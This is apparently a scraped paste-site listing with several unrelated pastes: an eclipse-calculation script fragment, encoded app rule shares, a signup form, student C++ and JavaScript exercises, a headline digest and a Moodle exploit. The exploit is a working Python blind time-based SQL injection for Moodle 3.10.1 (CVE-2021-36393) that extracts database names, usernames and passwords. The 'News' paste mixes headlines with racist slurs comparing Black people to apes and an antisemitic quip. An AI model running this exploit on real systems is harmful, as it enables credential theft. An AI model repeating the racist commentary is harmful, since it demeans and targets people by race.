const speed = dtDist/dtTime;
const dir = GC.calcAzimuth(loc, nextLoc);
const pathWidth = calcShadowSize(moonVec, sunVec, dir + D90, calcUmbraAngle);
const startTime = findTotalityEdgeAt(locVec, table[0].time, peakTime);
const endTime = findTotalityEdgeAt(locVec, peakTime, table.at(-1).time);
const duration = endTime - startTime;
const sunAngRad = calcAngularRadius(locVec, sunVec, sunRadius);
const moonAngRad = calcAngularRadius(locVec, moonVec, moonRadius);

console.log(' 1. Latitude:', strAngle(lat, 'N ', 'S '));
console.log(' 2. Longitude:', strAngle(lon, 'E ', 'W '));
console.log(' 3. Time:', strTime(peakTime));
console.log(' 4. Sun Alt.:', strAngle(sunAlt));
console.log(' 5. Moon:Sun ratio:', (moonAngRad/sunAngRad).toFixed(4));
console.log(' 6. Umbra E-W size:', strDist(umbraSizeEW));
console.log(' 7. Umbra N-S size:', strDist(umbraSizeNS));
console.log(' 8. Path angle:', strAngle(dir));
console.log(' 9. Path width:', strDist(pathWidth));
console.log('10. Ground speed:', strSpeed(speed));
console.log('11. Duration:', strDuration(duration));
console.log('12. Penumbra E-W size:', strDist(penumbraSizeEW));
console.log('12. Penumbra N-S size:', strDist(penumbraSizeNS));"
mDcPThyY,邀您一起看：🔥i3综合社区🔥,xiaomianao666,JavaScript,Saturday 13th of April 2024 12:41:07 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥🔥i3综合社区🔥@@
vZMMsX73,邀您一起看：2024年2月推荐,xiaomianao666,JavaScript,Saturday 13th of April 2024 12:13:21 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥2024年2月推荐@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi5aWH5aaZ5bel5YW3566xXCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eVwiLFwiY29sX3R5cGVcIjpcIng1X3dlYnZpZXdfc2luZ2xlXCIsXCJmaW5kX3J1bGVcIjpcImpzOnNldFJlc3VsdChbe1xcbiAgICB1cmw6XFxcImh0dHBzOi8vaGFpa3Vvc2hpamllLmNuL2FyY2hpdmVzLzIwMjRuaWFuLTJ5dWUtdHVpLWppYW5cXFwiLFxcbmRlc2M6XFxcIjEwMCUmJmZsb2F0XFxcIixcXG5leHRyYTp7Y2FuQmFjazogdHJ1ZX1cXG59XSk7XCIsXCJncm91cFwiOlwi5bel5YW3XCIsXCJwYWdlc1wiOlwiW11cIn0iLCJ0aXRsZSI6IjIwMjTlubQy5pyI5o6o6I2QIn0=
e0DTAWpQ,Loginhtml,GZTEAM,HTML,Saturday 13th of April 2024 12:08:18 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Crear Nuevo Usuario</title>
    <link rel=""stylesheet"" href=""styles.css""> <!-- Agregar esta línea para vincular el archivo CSS externo -->
</head>
<body>
    <h1>Create username : </h1>
    <form action=""/login"" method=""post"">
        <input type=""text"" name=""username"" required />
        <button type=""submit"">Crear usuario</button>
    </form>
</body>
</html>
"
svqBSQv8,Untitled,35657,C++,Friday 12th of April 2024 11:52:41 PM CDT,"#include <iostream> 

using namespace std;

void print(int* arr, int size) {
    for (int i = 0; i < size; i++) {
        cout << arr[i] << "" "";
    }
    cout << endl;
}

void fill(int* arr, int size) {
    for (int i = 0; i < size; i++) {
        arr[i] = rand() % 10;
    }
}

int main() {
    setlocale(LC_ALL, ""ru"");

    srand(time(NULL));

    int size, type;

    cout << ""Введите размер массива: "";
    cin >> size;
    
    cout << ""Введите 0 для удаления четных элементов, 1 для удаления нечетных элементов: "";
    cin >> type;

    int* arr = new int[size];

    fill(arr, size);
    print(arr, size);

    int temp_size = size % 2 != 0 && type == 0 ? size / 2 + 1 : size / 2;

    int* temp = new int[temp_size];

    for (int i = type, k = 0; i < size; i += 2, k++) {
        temp[k] = arr[i];
    }

    delete[] arr;

    arr = temp;

    size = temp_size;

    print(arr, size);

    delete[] temp;
}"
StHYZu5x,2.Expense Tracker,Silviya7,JavaScript,Friday 12th of April 2024 11:23:18 PM CDT,"
function solve(){
    const ElementExpense=document.getElementById('expense');
    const Elementamount=document.getElementById('amount');
    const Elementdate=document.getElementById('date');
    const BtnAdd=document.getElementById('add-btn');
    const elementUl= document.getElementById('preview-list');
    const expenseElement= document.getElementById('expenses-list');
    const BtnDelete= document.querySelector('.btn.delete');
    

    BtnDelete.addEventListener('click',()=>{
        expenseElement.innerHTML='';
    });

    BtnAdd.addEventListener('click',()=>{
       /* console.log(ElementExpense.value);
        console.log(Elementamount.value);
        console.log(Elementdate.value);*/
    
        if(!ElementExpense.value || !Elementamount.value || !Elementdate.value){
           return;
        }
       
        let firstp=document.createElement('p');
    
        firstp.textContent=`Type: ${ElementExpense.value}`;
        let secondp=document.createElement('p');
        secondp.textContent=`Amount: ${Elementamount.value}$`;
        let thirdp=document.createElement('p');
        thirdp.textContent=`Date: ${Elementdate.value}`;
    
        const ElementArticle= document.createElement('article');
        ElementArticle.appendChild(firstp);
        ElementArticle.appendChild(secondp);
        ElementArticle.appendChild(thirdp);
    
        const Elementli=document.createElement('li');   
        const DivBtns= document.createElement('div');
        DivBtns.classList.add('buttons');
        const btnedit=document.createElement('button');
        const btnok=document.createElement('button');
    
        btnedit.classList.add('btn','edit');
        btnedit.textContent='EDIT';
        btnok.classList.add('btn','ok');
        btnok.textContent='OK';
    
        DivBtns.appendChild(btnedit);
        DivBtns.appendChild(btnok);
        Elementli.classList.add('expense-item');
    
        Elementli.appendChild(ElementArticle);
        elementUl.appendChild(Elementli);
        Elementli.appendChild(DivBtns);
        
         ElementExpense.value='';
         Elementamount.value='';
         Elementdate.value='';
         BtnAdd.setAttribute('disabled','disabled');      

        btnedit.addEventListener('click',()=>{
           let ListNodes= document.querySelectorAll('article p');
           let AllList=Array.from(ListNodes);

           ElementExpense.value=AllList[0].textContent.substring(6);
           Elementamount.value=AllList[1].textContent.substring(8,AllList[1].textContent.length-1);
           Elementdate.value=AllList[2].textContent.substring(6);
           Elementli.remove();
           BtnAdd.removeAttribute('disabled');
        });

        btnok.addEventListener('click',()=>{         
            
            expenseElement.appendChild(Elementli);
            DivBtns.remove();
            BtnAdd.removeAttribute('disabled');
        });
       
});
}"
PH0ZarRP,"Moodle 3.10.1 - Authenticated Blind Time-Based SQL Injection - ""sort"" parameter",FlyFar,Python,Friday 12th of April 2024 10:38:13 PM CDT,"# Exploit Title: Moodle Authenticated Time-Based Blind SQL Injection - ""sort"" Parameter
# Google Dork: 
# Date: 04/11/2023
# Exploit Author: Julio Ángel Ferrari (Aka. T0X1Cx)
# Vendor Homepage: https://moodle.org/
# Software Link: 
# Version: 3.10.1
# Tested on: Linux
# CVE : CVE-2021-36393

import requests
import string
from termcolor import colored

# Request details
URL = ""http://127.0.0.1:8080/moodle/lib/ajax/service.php?sesskey=ZT0E6J0xWe&info=core_course_get_enrolled_courses_by_timeline_classification""
HEADERS = {
    ""Accept"": ""application/json, text/javascript, */*; q=0.01"",
    ""Content-Type"": ""application/json"",
    ""X-Requested-With"": ""XMLHttpRequest"",
    ""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36"",
    ""Origin"": ""http://127.0.0.1:8080"",
    ""Referer"": ""http://127.0.0.1:8080/moodle/my/"",
    ""Accept-Encoding"": ""gzip, deflate"",
    ""Accept-Language"": ""en-US,en;q=0.9"",
    ""Cookie"": ""MoodleSession=5b1rk2pfdpbcq2i5hmmern1os0"",
    ""Connection"": ""close""
}

# Characters to test
characters_to_test = string.ascii_lowercase + string.ascii_uppercase + string.digits + ""!@#$^&*()-_=+[]{}|;:'\"",.<>?/""

def test_character(payload):
    response = requests.post(URL, headers=HEADERS, json=[payload])
    return response.elapsed.total_seconds() >= 3

def extract_value(column, label):
    base_payload = {
        ""index"": 0,
        ""methodname"": ""core_course_get_enrolled_courses_by_timeline_classification"",
        ""args"": {
            ""offset"": 0,
            ""limit"": 0,
            ""classification"": ""all"",
            ""sort"": """",
            ""customfieldname"": """",
            ""customfieldvalue"": """"
        }
    }

    result = """"
    for _ in range(50):  # Assumes a maximum of 50 characters for the value
        character_found = False
        for character in characters_to_test:
            if column == ""database()"":
                base_payload[""args""][""sort""] = f""fullname OR (database()) LIKE '{result + character}%' AND SLEEP(3)""
            else:
                base_payload[""args""][""sort""] = f""fullname OR (SELECT {column} FROM mdl_user LIMIT 1 OFFSET 0) LIKE '{result + character}%' AND SLEEP(3)""
            
            if test_character(base_payload):
                result += character
                print(colored(f""{label}: {result}"", 'red'), end=""\r"")
                character_found = True
                break

        if not character_found:
            break

    # Print the final result
    print(colored(f""{label}: {result}"", 'red'))

if __name__ == ""__main__"":
    extract_value(""database()"", ""Database"")
    extract_value(""username"", ""Username"")
    extract_value(""password"", ""Password"")
            "
Hy7Kmz6Q,News April12 24,Newscaster_Ned,Email,Friday 12th of April 2024 10:29:14 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

W‎e‎l‎l‎ ‎n‎o‎ ‎m‎o‎r‎e‎ ‎J‎u‎i‎c‎e‎.‎ ‎I‎ ‎w‎i‎s‎h‎ ‎I‎ ‎s‎a‎i‎d‎ ‎J‎e‎w‎s‎.‎

C‎u‎e‎l‎l‎a‎r‎:‎ ‎B‎i‎d‎e‎n‎ ‎C‎a‎n‎ ‎A‎c‎t‎ ‎U‎n‎i‎l‎a‎t‎e‎r‎a‎l‎l‎y‎ ‎o‎n‎ ‎B‎o‎r‎d‎e‎r‎,‎ ‎H‎e‎ ‎S‎h‎o‎u‎l‎d‎ ‎D‎o‎ ‎W‎h‎a‎t‎ ‎O‎b‎a‎m‎a‎ ‎D‎i‎d‎
N‎i‎g‎e‎r‎i‎a‎n‎ ‎B‎r‎o‎t‎h‎e‎r‎s‎ ‎P‎l‎e‎a‎d‎ ‎G‎u‎i‎l‎t‎y‎ ‎t‎o‎ ‎S‎e‎x‎t‎o‎r‎t‎i‎n‎g‎ ‎T‎e‎e‎n‎ ‎W‎h‎o‎ ‎C‎o‎m‎m‎i‎t‎t‎e‎d‎ ‎S‎u‎i‎c‎i‎d‎e‎
M‎a‎n‎c‎h‎i‎n‎:‎ ‎B‎i‎d‎e‎n‎ ‎'‎N‎e‎e‎d‎s‎ ‎t‎o‎ ‎M‎o‎v‎e‎'‎ ‎t‎o‎ ‎G‎e‎t‎ ‎M‎y‎ ‎S‎u‎p‎p‎o‎r‎t‎,‎ ‎H‎e‎ ‎N‎e‎e‎d‎s‎ ‎t‎o‎ ‎A‎c‎t‎ ‎o‎n‎ ‎B‎o‎r‎d‎e‎r‎
M‎a‎n‎c‎h‎i‎n‎:‎ ‎B‎i‎d‎e‎n‎'‎s‎ ‎B‎e‎e‎n‎ ‎P‎u‎s‎h‎e‎d‎ ‎t‎o‎ ‎'‎T‎o‎o‎ ‎F‎a‎r‎ ‎L‎e‎f‎t‎'‎ ‎P‎o‎s‎i‎t‎i‎o‎n‎s‎ ‎H‎e‎ ‎D‎o‎e‎s‎n‎'‎t‎ ‎B‎e‎l‎i‎e‎v‎e‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
G‎O‎P‎ ‎W‎T‎F‎:‎ ‎E‎i‎g‎h‎t‎y‎-‎S‎i‎x‎ ‎H‎o‎u‎s‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎V‎o‎t‎e‎ ‎f‎o‎r‎ ‎W‎a‎r‎r‎a‎n‎t‎l‎e‎s‎s‎ ‎S‎u‎r‎v‎e‎i‎l‎l‎a‎n‎c‎e‎ ‎o‎f‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎

‘‎S‎a‎d‎ ‎D‎a‎y‎ ‎f‎o‎r‎ ‎A‎m‎e‎r‎i‎c‎a‎’‎
S‎p‎e‎a‎k‎e‎r‎ ‎o‎f‎ ‎t‎h‎e‎ ‎H‎o‎u‎s‎e‎ ‎M‎i‎k‎e‎ ‎J‎o‎h‎n‎s‎o‎n‎,‎ ‎R‎-‎L‎a‎.‎,‎ ‎w‎a‎i‎t‎s‎ ‎t‎o‎ ‎r‎a‎i‎s‎e‎ ‎t‎h‎e‎ ‎g‎a‎v‎e‎l‎ ‎t‎o‎ ‎f‎o‎r‎m‎a‎l‎l‎y‎ ‎c‎o‎n‎c‎l‎u‎d‎e‎ ‎a‎
E‎i‎g‎h‎t‎y‎-‎s‎i‎x‎ ‎H‎o‎u‎s‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎o‎n‎ ‎F‎r‎i‎d‎a‎y‎ ‎v‎o‎t‎e‎d‎ ‎a‎g‎a‎i‎n‎s‎t‎ ‎a‎n‎ ‎a‎m‎e‎n‎d‎m‎e‎n‎t‎ ‎t‎o‎ ‎r‎e‎q‎u‎i‎r‎e‎ ‎a‎ ‎w‎a‎r‎r‎a‎n‎t‎ ‎f‎o‎r‎ ‎s‎u‎r‎v‎e‎i‎l‎l‎a‎n‎c‎e‎ ‎o‎f‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎’‎ ‎c‎o‎m‎m‎u‎n‎i‎c‎a‎t‎i‎o‎n‎s‎.‎

E‎i‎g‎h‎t‎y‎-‎S‎i‎x‎ ‎H‎o‎u‎s‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎V‎o‎t‎e‎ ‎f‎o‎r‎ ‎W‎a‎r‎r‎a‎n‎t‎l‎e‎s‎s‎ ‎S‎u‎r‎v‎e‎i‎l‎l‎a‎n‎c‎e‎ ‎o‎f‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎
E‎i‎g‎h‎t‎y‎-‎S‎i‎x‎ ‎H‎o‎u‎s‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎f‎o‎r‎ ‎W‎a‎r‎r‎a‎n‎t‎l‎e‎s‎s‎ ‎S‎u‎r‎v‎e‎i‎l‎l‎a‎n‎c‎e‎ ‎o‎f‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎
5‎,‎8‎7‎8‎
B‎i‎d‎e‎n‎’‎s‎ ‎C‎a‎t‎c‎h‎ ‎a‎n‎d‎ ‎R‎e‎l‎e‎a‎s‎e‎:‎ ‎A‎f‎g‎h‎a‎n‎ ‎M‎i‎g‎r‎a‎n‎t‎ ‎o‎n‎ ‎T‎e‎r‎r‎o‎r‎i‎s‎t‎ ‎W‎a‎t‎c‎h‎l‎i‎s‎t‎ ‎T‎w‎i‎c‎e‎ ‎F‎r‎e‎e‎d‎ ‎i‎n‎t‎o‎ ‎U‎.‎S‎.‎
C‎a‎t‎c‎h‎ ‎a‎n‎d‎ ‎R‎e‎l‎e‎a‎s‎e‎:‎ ‎A‎f‎g‎h‎a‎n‎ ‎o‎n‎ ‎T‎e‎r‎r‎o‎r‎i‎s‎t‎ ‎W‎a‎t‎c‎h‎l‎i‎s‎t‎ ‎T‎w‎i‎c‎e‎ ‎F‎r‎e‎e‎d‎ ‎i‎n‎t‎o‎ ‎U‎.‎S‎.‎
9‎1‎6‎
U‎.‎S‎.‎ ‎F‎e‎a‎r‎s‎ ‎I‎r‎a‎n‎ ‎A‎t‎t‎a‎c‎k‎ ‎o‎n‎ ‎I‎s‎r‎a‎e‎l‎;‎ ‎T‎e‎l‎l‎s‎ ‎D‎i‎p‎l‎o‎m‎a‎t‎i‎c‎ ‎S‎t‎a‎f‎f‎ ‎N‎o‎t‎ ‎t‎o‎ ‎T‎r‎a‎v‎e‎l‎
U‎.‎S‎.‎ ‎F‎e‎a‎r‎s‎ ‎I‎r‎a‎n‎ ‎A‎t‎t‎a‎c‎k‎ ‎o‎n‎ ‎I‎s‎r‎a‎e‎l‎;‎ ‎T‎e‎l‎l‎s‎ ‎D‎i‎p‎l‎o‎m‎a‎t‎i‎c‎ ‎S‎t‎a‎f‎f‎ ‎N‎o‎t‎ ‎t‎o‎ ‎T‎r‎a‎v‎e‎l‎
4‎,‎7‎0‎8‎
V‎I‎D‎E‎O‎ ‎–‎ ‎‘‎H‎o‎r‎r‎e‎n‎d‎o‎u‎s‎’‎:‎ ‎N‎Y‎C‎ ‎1‎6‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎w‎i‎t‎h‎ ‎R‎a‎p‎ ‎S‎h‎e‎e‎t‎ ‎A‎c‎c‎u‎s‎e‎d‎ ‎o‎f‎ ‎S‎h‎o‎v‎i‎n‎g‎ ‎E‎l‎d‎e‎r‎l‎y‎ ‎W‎o‎m‎a‎n‎
V‎I‎D‎E‎O‎:‎ ‎N‎Y‎C‎ ‎T‎e‎e‎n‎ ‎w‎i‎t‎h‎ ‎R‎a‎p‎ ‎S‎h‎e‎e‎t‎ ‎A‎c‎c‎u‎s‎e‎d‎ ‎o‎f‎ ‎S‎h‎o‎v‎i‎n‎g‎ ‎W‎o‎m‎a‎n‎ ‎D‎o‎w‎n‎ ‎C‎h‎u‎r‎c‎h‎ ‎S‎t‎e‎p‎s‎
1‎6‎6‎
D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎,‎ ‎S‎p‎e‎a‎k‎e‎r‎ ‎M‎i‎k‎e‎ ‎J‎o‎h‎n‎s‎o‎n‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎ ‎I‎n‎t‎e‎g‎r‎i‎t‎y‎ ‎B‎i‎l‎l‎:‎ ‎‘‎C‎o‎m‎m‎o‎n‎ ‎S‎e‎n‎s‎e‎’‎
D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎,‎ ‎S‎p‎e‎a‎k‎e‎r‎ ‎M‎i‎k‎e‎ ‎J‎o‎h‎n‎s‎o‎n‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎ ‎I‎n‎t‎e‎g‎r‎i‎t‎y‎ ‎B‎i‎l‎l‎
1‎6‎4‎
‘‎R‎e‎a‎c‎h‎e‎r‎’‎ ‎S‎t‎a‎r‎ ‎A‎l‎a‎n‎ ‎R‎i‎t‎c‎h‎s‎o‎n‎ ‎A‎t‎t‎a‎c‎k‎s‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎s‎ ‎W‎h‎o‎ ‎S‎u‎p‎p‎o‎r‎t‎ ‎‘‎R‎a‎p‎i‎s‎t‎’‎ ‎T‎r‎u‎m‎p‎:‎
A‎l‎a‎n‎ ‎R‎i‎t‎c‎h‎s‎o‎n‎ ‎B‎l‎a‎s‎t‎s‎ ‎C‎h‎r‎i‎s‎t‎i‎a‎n‎s‎ ‎W‎h‎o‎ ‎S‎u‎p‎p‎o‎r‎t‎ ‎'‎R‎a‎p‎i‎s‎t‎'‎ ‎T‎r‎u‎m‎p‎
4‎,‎4‎2‎8‎
T‎r‎u‎m‎p‎ ‎F‎l‎a‎n‎k‎e‎d‎ ‎b‎y‎ ‎J‎o‎h‎n‎s‎o‎n‎:‎ ‎‘‎I‎’‎m‎ ‎N‎o‎t‎ ‎a‎ ‎B‎i‎g‎ ‎F‎a‎n‎ ‎o‎f‎ ‎F‎I‎S‎A‎;‎ ‎I‎ ‎T‎h‎i‎n‎k‎ ‎I‎t‎’‎s‎ ‎T‎e‎r‎r‎i‎b‎l‎e‎’‎
T‎r‎u‎m‎p‎:‎ ‎‘‎I‎’‎m‎ ‎N‎o‎t‎ ‎a‎ ‎B‎i‎g‎ ‎F‎a‎n‎ ‎o‎f‎ ‎F‎I‎S‎A‎;‎ ‎I‎ ‎T‎h‎i‎n‎k‎ ‎I‎t‎'‎s‎ ‎T‎e‎r‎r‎i‎b‎l‎e‎'‎
1‎7‎9‎
G‎o‎v‎.‎ ‎H‎o‎b‎b‎s‎:‎ ‎‘‎A‎r‎i‎z‎o‎n‎a‎ ‎W‎o‎m‎e‎n‎ ‎W‎i‎l‎l‎ ‎D‎i‎e‎’‎ ‎U‎n‎d‎e‎r‎ ‎S‎t‎a‎t‎e‎ ‎A‎b‎o‎r‎t‎i‎o‎n‎ ‎B‎a‎n‎
G‎o‎v‎.‎ ‎H‎o‎b‎b‎s‎:‎ ‎'‎A‎r‎i‎z‎o‎n‎a‎ ‎W‎o‎m‎e‎n‎ ‎W‎i‎l‎l‎ ‎D‎i‎e‎ ‎U‎n‎d‎e‎r‎ ‎t‎h‎i‎s‎ ‎B‎a‎n‎,‎'‎ ‎I‎t‎ ‎S‎h‎o‎u‎l‎d‎ ‎B‎e‎ ‎R‎e‎p‎e‎a‎l‎e‎d‎
2‎8‎0‎
C‎h‎a‎s‎t‎e‎n‎ ‎B‎u‎t‎t‎i‎g‎i‎e‎g‎:‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎A‎r‎e‎ ‎T‎e‎l‎l‎i‎n‎g‎ ‎S‎u‎i‎c‎i‎d‎a‎l‎ ‎L‎G‎B‎T‎Q‎ ‎P‎e‎o‎p‎l‎e‎ ‎t‎o‎ ‎‘‎P‎u‎l‎l‎ ‎t‎h‎e‎ ‎T‎r‎i‎g‎g‎e‎r‎’‎
C‎h‎a‎s‎t‎e‎n‎ ‎B‎u‎t‎t‎i‎g‎i‎e‎g‎:‎ ‎G‎O‎P‎ ‎T‎e‎l‎l‎i‎n‎g‎ ‎S‎u‎i‎c‎i‎d‎a‎l‎ ‎L‎G‎B‎T‎Q‎ ‎P‎e‎o‎p‎l‎e‎ ‎'‎P‎u‎l‎l‎ ‎t‎h‎e‎ ‎T‎r‎i‎g‎g‎e‎r‎'‎
2‎0‎5‎
A‎P‎ ‎W‎i‎r‎e‎:‎ ‎‘‎A‎ ‎H‎e‎a‎l‎t‎h‎y‎ ‎U‎.‎S‎.‎ ‎E‎c‎o‎n‎o‎m‎y‎’‎s‎ ‎S‎e‎c‎r‎e‎t‎ ‎I‎n‎g‎r‎e‎d‎i‎e‎n‎t‎?‎ ‎I‎m‎m‎i‎g‎r‎a‎n‎t‎ ‎W‎o‎r‎k‎e‎r‎s‎,‎ ‎E‎a‎g‎e‎r‎ ‎t‎o‎ ‎F‎i‎l‎l‎ ‎J‎o‎b‎s‎
A‎P‎ ‎W‎i‎r‎e‎:‎ ‎‘‎A‎ ‎H‎e‎a‎l‎t‎h‎y‎ ‎U‎.‎S‎.‎ ‎E‎c‎o‎n‎o‎m‎y‎’‎s‎ ‎S‎e‎c‎r‎e‎t‎ ‎I‎n‎g‎r‎e‎d‎i‎e‎n‎t‎?‎ ‎I‎m‎m‎i‎g‎r‎a‎n‎t‎ ‎W‎o‎r‎k‎e‎r‎s‎,‎ ‎E‎a‎g‎e‎r‎ ‎t‎o‎ ‎F‎i‎l‎l‎ ‎J‎o‎b‎s‎’‎

F‎l‎o‎r‎i‎d‎a‎:‎ ‎S‎h‎e‎b‎o‎o‎n‎ ‎S‎h‎o‎o‎t‎s‎ ‎a‎ ‎B‎u‎n‎c‎h‎ ‎o‎f‎ ‎P‎e‎o‎p‎l‎e‎ ‎D‎u‎r‎i‎n‎g‎ ‎S‎o‎l‎a‎r‎ ‎E‎c‎l‎i‎p‎s‎e‎ ‎B‎e‎c‎a‎u‎s‎e‎,‎ ‎""‎G‎o‎d‎ ‎t‎o‎l‎d‎ ‎h‎e‎r‎ ‎t‎o‎ ‎d‎o‎ ‎i‎t‎""‎.‎

N‎e‎g‎r‎o‎e‎s‎ ‎a‎l‎w‎a‎y‎s‎ ‎f‎r‎e‎a‎k‎ ‎o‎u‎t‎ ‎w‎h‎e‎n‎ ‎s‎o‎m‎e‎t‎h‎i‎n‎g‎ ‎h‎a‎p‎p‎e‎n‎s‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎d‎o‎n‎'‎t‎ ‎u‎n‎d‎e‎r‎s‎t‎a‎n‎d‎.‎


F‎e‎m‎a‎l‎e‎ ‎B‎a‎b‎o‎o‎n‎ ‎C‎h‎a‎r‎g‎e‎d‎ ‎i‎n‎ ‎F‎a‎t‎a‎l‎l‎y‎ ‎S‎h‎o‎o‎t‎i‎n‎g‎ ‎S‎E‎P‎T‎A‎ ‎D‎r‎i‎v‎e‎r‎.‎


D‎a‎l‎l‎a‎s‎ ‎C‎o‎u‎n‎t‎y‎:‎ ‎2‎ ‎B‎a‎l‎l‎s‎ ‎o‎f‎ ‎P‎u‎b‎e‎s‎ ‎w‎i‎t‎h‎ ‎N‎e‎g‎r‎o‎e‎s‎ ‎U‎n‎d‎e‎r‎ ‎T‎h‎e‎m‎ ‎G‎e‎t‎ ‎3‎0‎ ‎Y‎e‎a‎r‎s‎ ‎A‎f‎t‎e‎r‎ ‎S‎m‎u‎g‎g‎l‎i‎n‎g‎ ‎F‎e‎n‎t‎a‎n‎y‎l‎.‎


N‎u‎n‎c‎h‎u‎c‎k‎-‎W‎i‎e‎l‎d‎i‎n‎g‎ ‎M‎o‎n‎k‎e‎y‎ ‎F‎r‎e‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎A‎t‎t‎a‎c‎k‎i‎n‎g‎ ‎W‎h‎i‎t‎e‎ ‎M‎a‎n‎ ‎o‎n‎ ‎N‎Y‎C‎ ‎S‎u‎b‎w‎a‎y‎.‎


S‎u‎r‎v‎i‎v‎o‎r‎s‎ ‎T‎e‎s‎t‎i‎f‎y‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎C‎h‎i‎m‎p‎ ‎W‎h‎o‎ ‎S‎h‎o‎t‎ ‎u‎p‎ ‎G‎r‎e‎y‎h‎o‎u‎n‎d‎ ‎B‎u‎s‎ ‎i‎n‎ ‎C‎a‎l‎i‎f‎o‎r‎n‎i‎a‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎d‎a‎y‎
M‎o‎s‎t‎l‎y‎ ‎S‎u‎n‎n‎y‎
8‎2‎°‎
/‎5‎7‎°‎
2‎%‎
S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎2‎ ‎|‎ ‎D‎a‎y‎
8‎2‎°‎
2‎%‎
S‎S‎E‎
1‎2‎
 ‎
m‎p‎h‎
A‎ ‎m‎i‎x‎ ‎o‎f‎ ‎c‎l‎o‎u‎d‎s‎ ‎a‎n‎d‎ ‎s‎u‎n‎.‎ ‎H‎i‎g‎h‎ ‎8‎2‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
5‎6‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
9‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎0‎6‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
7‎:‎5‎5‎ ‎p‎m‎
F‎r‎i‎ ‎1‎2‎ ‎|‎ ‎N‎i‎g‎h‎t‎
5‎7‎°‎
9‎%‎
S‎S‎E‎
1‎1‎
 ‎
m‎p‎h‎
S‎o‎m‎e‎ ‎c‎l‎o‎u‎d‎s‎.‎ ‎L‎o‎w‎ ‎5‎7‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎S‎E‎ ‎a‎t‎ ‎1‎0‎ ‎t‎o‎ ‎1‎5‎ ‎m‎p‎h‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
7‎4‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
9‎:‎4‎9‎ ‎a‎m‎
W‎a‎x‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
M‎o‎o‎n‎s‎e‎t‎
-‎-‎
